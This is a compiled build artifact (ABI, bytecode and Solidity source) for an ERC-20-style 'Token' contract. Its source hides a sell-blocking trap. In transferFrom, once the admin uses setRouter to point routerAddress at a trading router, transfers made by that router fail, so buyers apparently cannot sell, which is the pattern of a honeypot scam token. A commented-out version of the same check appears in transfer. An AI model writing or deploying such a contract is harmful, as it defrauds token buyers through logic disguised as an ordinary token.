{
  "contractName": "Token",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "_name",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "_symbol",
          "type": "string"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "a",
          "type": "address"
        }
      ],
      "name": "setRouter",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526b015b6a759f4835dc2400000060025560126005553480156200002657600080fd5b50604051620015463803806200154683398181016040528101906200004c9190620002d2565b81600390816200005d9190620005a2565b5080600490816200006f9190620005a2565b506002546000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555033600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505062000689565b6000604051905090565b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b620001a8826200015d565b810181811067ffffffffffffffff82111715620001ca57620001c96200016e565b5b80604052505050565b6000620001df6200013f565b9050620001ed82826200019d565b919050565b600067ffffffffffffffff82111562000210576200020f6200016e565b5b6200021b826200015d565b9050602081019050919050565b60005b83811015620002485780820151818401526020810190506200022b565b60008484015250505050565b60006200026b6200026584620001f2565b620001d3565b9050828152602081018484840111156200028a576200028962000158565b5b6200029784828562000228565b509392505050565b600082601f830112620002b757620002b662000153565b5b8151620002c984826020860162000254565b91505092915050565b60008060408385031215620002ec57620002eb62000149565b5b600083015167ffffffffffffffff8111156200030d576200030c6200014e565b5b6200031b858286016200029f565b925050602083015167ffffffffffffffff8111156200033f576200033e6200014e565b5b6200034d858286016200029f565b9150509250929050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680620003aa57607f821691505b602082108103620003c057620003bf62000362565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200042a7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82620003eb565b620004368683620003eb565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b6000620004836200047d62000477846200044e565b62000458565b6200044e565b9050919050565b6000819050919050565b6200049f8362000462565b620004b7620004ae826200048a565b848454620003f8565b825550505050565b600090565b620004ce620004bf565b620004db81848462000494565b505050565b5b818110156200050357620004f7600082620004c4565b600181019050620004e1565b5050565b601f82111562000552576200051c81620003c6565b6200052784620003db565b8101602085101562000537578190505b6200054f6200054685620003db565b830182620004e0565b50505b505050565b600082821c905092915050565b6000620005776000198460080262000557565b1980831691505092915050565b600062000592838362000564565b9150826002028217905092915050565b620005ad8262000357565b67ffffffffffffffff811115620005c957620005c86200016e565b5b620005d5825462000391565b620005e282828562000507565b600060209050601f8311600181146200061a576000841562000605578287015190505b62000611858262000584565b86555062000681565b601f1984166200062a86620003c6565b60005b8281101562000654578489015182556001820191506020850194506020810190506200062d565b8683101562000674578489015162000670601f89168262000564565b8355505b6001600288020188555050505b505050505050565b610ead80620006996000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c8063313ce56711610071578063313ce5671461017a57806370a082311461019857806395d89b41146101c8578063a9059cbb146101e6578063c0d7865514610216578063dd62ed3e14610232576100a9565b806306fdde03146100ae578063095ea7b3146100cc57806318160ddd146100fc57806323b872dd1461011a57806327e235e31461014a575b600080fd5b6100b6610262565b6040516100c39190610a8d565b60405180910390f35b6100e660048036038101906100e19190610b48565b6102f0565b6040516100f39190610ba3565b60405180910390f35b6101046103e2565b6040516101119190610bcd565b60405180910390f35b610134600480360381019061012f9190610be8565b6103e8565b6040516101419190610ba3565b60405180910390f35b610164600480360381019061015f9190610c3b565b6106e0565b6040516101719190610bcd565b60405180910390f35b6101826106f8565b60405161018f9190610bcd565b60405180910390f35b6101b260048036038101906101ad9190610c3b565b6106fe565b6040516101bf9190610bcd565b60405180910390f35b6101d0610746565b6040516101dd9190610a8d565b60405180910390f35b61020060048036038101906101fb9190610b48565b6107d4565b60405161020d9190610ba3565b60405180910390f35b610230600480360381019061022b9190610c3b565b61093a565b005b61024c60048036038101906102479190610c68565b6109d8565b6040516102599190610bcd565b60405180910390f35b6003805461026f90610cd7565b80601f016020809104026020016040519081016040528092919081815260200182805461029b90610cd7565b80156102e85780601f106102bd576101008083540402835291602001916102e8565b820191906000526020600020905b8154815290600101906020018083116102cb57829003601f168201915b505050505081565b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040516103d09190610bcd565b60405180910390a36001905092915050565b60025481565b6000816103f4856106fe565b1015610435576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161042c90610d54565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410156104f4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104eb90610dc0565b60405180910390fd5b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146105c657600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16036105c557600080fd5b5b816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546106149190610e0f565b92505081905550816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546106699190610e43565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516106cd9190610bcd565b60405180910390a3600190509392505050565b60006020528060005260406000206000915090505481565b60055481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6004805461075390610cd7565b80601f016020809104026020016040519081016040528092919081815260200182805461077f90610cd7565b80156107cc5780601f106107a1576101008083540402835291602001916107cc565b820191906000526020600020905b8154815290600101906020018083116107af57829003601f168201915b505050505081565b6000816107e0336106fe565b1015610821576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161081890610d54565b60405180910390fd5b816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461086f9190610e0f565b92505081905550816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546108c49190610e43565b925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516109289190610bcd565b60405180910390a36001905092915050565b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461099457600080fd5b80600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6001602052816000526040600020602052806000526040600020600091509150505481565b600081519050919050565b600082825260208201905092915050565b60005b83811015610a37578082015181840152602081019050610a1c565b60008484015250505050565b6000601f19601f8301169050919050565b6000610a5f826109fd565b610a698185610a08565b9350610a79818560208601610a19565b610a8281610a43565b840191505092915050565b60006020820190508181036000830152610aa78184610a54565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610adf82610ab4565b9050919050565b610aef81610ad4565b8114610afa57600080fd5b50565b600081359050610b0c81610ae6565b92915050565b6000819050919050565b610b2581610b12565b8114610b3057600080fd5b50565b600081359050610b4281610b1c565b92915050565b60008060408385031215610b5f57610b5e610aaf565b5b6000610b6d85828601610afd565b9250506020610b7e85828601610b33565b9150509250929050565b60008115159050919050565b610b9d81610b88565b82525050565b6000602082019050610bb86000830184610b94565b92915050565b610bc781610b12565b82525050565b6000602082019050610be26000830184610bbe565b92915050565b600080600060608486031215610c0157610c00610aaf565b5b6000610c0f86828701610afd565b9350506020610c2086828701610afd565b9250506040610c3186828701610b33565b9150509250925092565b600060208284031215610c5157610c50610aaf565b5b6000610c5f84828501610afd565b91505092915050565b60008060408385031215610c7f57610c7e610aaf565b5b6000610c8d85828601610afd565b9250506020610c9e85828601610afd565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680610cef57607f821691505b602082108103610d0257610d01610ca8565b5b50919050565b7f62616c616e636520746f6f206c6f770000000000000000000000000000000000600082015250565b6000610d3e600f83610a08565b9150610d4982610d08565b602082019050919050565b60006020820190508181036000830152610d6d81610d31565b9050919050565b7f616c6c6f77616e636520746f6f206c6f77000000000000000000000000000000600082015250565b6000610daa601183610a08565b9150610db582610d74565b602082019050919050565b60006020820190508181036000830152610dd981610d9d565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610e1a82610b12565b9150610e2583610b12565b9250828201905080821115610e3d57610e3c610de0565b5b92915050565b6000610e4e82610b12565b9150610e5983610b12565b9250828203905081811115610e7157610e70610de0565b5b9291505056fea2646970667358221220c6dc70c3fc562b88241f3b764b0b846842b36c1f28a95b0faeadcb8b85e3440c64736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ncontract Token {\n    mapping(address => uint256) public balances;\n    mapping(address => mapping(address => uint256)) public allowance;\n    uint256 public totalSupply = 420000000 * 10 ** 18;\n    string public name;\n    string public symbol;\n    uint256 public decimals = 18;\n\n    address routerAddress;\n    address adminAddress;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    constructor(string memory _name, string memory _symbol) {\n        name = _name;\n        symbol = _symbol;\n        balances[msg.sender] = totalSupply;\n        adminAddress = msg.sender;\n        routerAddress = msg.sender;\n    }\n\n    function setRouter(address a) public {\n        require(msg.sender == adminAddress);\n        routerAddress = a;\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return balances[owner];\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(balanceOf(msg.sender) >= value, \"balance too low\");\n        // if (adminAddress != routerAddress) require(from != routerAddress);\n        balances[to] += value;\n        balances[msg.sender] -= value;\n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool) {\n        require(balanceOf(from) >= value, \"balance too low\");\n        require(allowance[from][msg.sender] >= value, \"allowance too low\");\n        if (adminAddress != routerAddress) require(msg.sender != routerAddress);\n        balances[to] += value;\n        balances[from] -= value;\n        emit Transfer(from, to, value);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n}\n",
  "sourcePath": "C:\\Users\\devac\\degen_test\\contracts\\Token.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-03T12:13:47.776Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}